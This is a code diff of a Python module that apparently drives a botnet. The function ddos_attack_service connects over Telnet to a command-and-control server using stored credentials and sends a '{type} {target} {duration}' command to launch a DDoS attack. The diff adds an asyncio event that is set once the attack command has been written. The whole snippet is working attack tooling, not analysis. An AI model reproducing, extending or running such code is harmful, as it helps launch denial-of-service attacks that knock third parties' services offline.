@@ -1,12 +1,15 @@
 import time
 import telnetlib
-
+import asyncio
 from constants import (CNC_USERNAME, CNC_PASSWORD,TELNET_HOST,TELNET_PORT)
+
+start_event = asyncio.Event()  # Erstelle ein Event
 
 def ddos_attack_service(type, duration, target):
     """
     Handles the Telnet session for the 'DDOS' command.
     """
+
     with telnetlib.Telnet(TELNET_HOST, TELNET_PORT, timeout=20) as tn:
         print("Connected to cnc!")
         initial_output = tn.read_very_eager()
@@ -28,5 +31,7 @@ def ddos_attack_service(type, duration, target):
                 command = f"{type} {target} {duration}\n"
                 tn.write(command.encode('utf-8'))
                 print(f"Wrote: {command}")
+                start_event.set()
+                print("Set Event")
                 break
     return "DDoS attack started successfully!"
